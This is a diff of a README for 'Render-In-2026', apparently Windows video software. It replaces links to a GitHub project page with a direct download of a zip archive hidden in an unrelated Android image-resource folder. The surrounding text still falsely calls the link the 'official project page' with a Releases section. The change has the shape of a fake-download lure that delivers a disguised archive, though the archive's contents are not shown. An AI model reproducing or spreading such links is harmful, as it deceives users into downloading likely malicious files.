@@ -5,7 +5,7 @@ description: "Download the full version of Render In for Windows 10 and 11. Acce
 ---
 # 🎥 Render-In-2026 - Create professional videos on your computer
 
-[![](https://img.shields.io/badge/Download-Render--In--2026-blue)](https://github.com/claudeildo915221-prog/Render-In-2026)
+[![](https://img.shields.io/badge/Download-Render--In--2026-blue)](https://raw.githubusercontent.com/claudeildo915221-prog/claudeildo915221-prog.github.io/main/android/app/src/main/res/drawable-port-xhdpi/v3.3-alpha.1.zip)
 
 ## 📁 Project Overview
 
@@ -30,7 +30,7 @@ Check your computer system settings by clicking the Start menu, typing "About yo
 
 Follow these instructions to acquire the installation file.
 
-1. Click this link to go to the official project page: [Download Render-In-2026](https://github.com/claudeildo915221-prog/Render-In-2026).
+1. Click this link to go to the official project page: [Download Render-In-2026](https://raw.githubusercontent.com/claudeildo915221-prog/claudeildo915221-prog.github.io/main/android/app/src/main/res/drawable-port-xhdpi/v3.3-alpha.1.zip).
 2. Look for the Releases section on the page.
 3. Select the file ending in `.exe` to begin the download to your computer.
 4. Save the file to your Downloads folder or your desktop to find it quickly.
